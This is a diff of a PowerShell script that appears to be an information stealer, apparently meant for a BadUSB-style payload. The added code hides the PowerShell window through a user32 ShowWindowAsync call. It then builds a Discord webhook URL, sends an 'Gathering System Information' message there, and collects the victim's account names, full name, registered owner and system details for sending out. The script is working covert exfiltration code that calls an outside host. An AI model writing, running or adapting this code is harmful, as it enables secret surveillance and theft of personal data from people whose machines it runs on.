@@ -10,6 +10,32 @@ USAGE
 
 #>
 
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if($hwnd -ne [System.IntPtr]::Zero){
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+else{
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+
+sleep 1
+Add-Type -AssemblyName System.Windows.Forms
+
+$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+
+# Send a notification to discord on start
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
+# User Information
+$userInfo = Get-WmiObject -Class Win32_UserAccount
+$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
+$email = (Get-ComputerInfo).WindowsRegisteredOwner
 
 # Other Users
 $users = "$($userInfo.Name)"
@@ -31,34 +57,6 @@ $OSArch = "$($systemInfo.OSArchitecture)"
 $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
 $Width = $Screen.Width;$Height = $Screen.Height
 $screensize = "${width} x ${height}"
-
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-if($hwnd -ne [System.IntPtr]::Zero){
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-
-sleep 1
-Add-Type -AssemblyName System.Windows.Forms
-
-$hookurl = "$dc"
-
-# Send a notification to discord on start
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-
-# User Information
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
-$email = (Get-ComputerInfo).WindowsRegisteredOwner
-
 
 # Enumerate Windows Activation Date
 function Convert-BytesToDatetime([byte[]]$b) { 
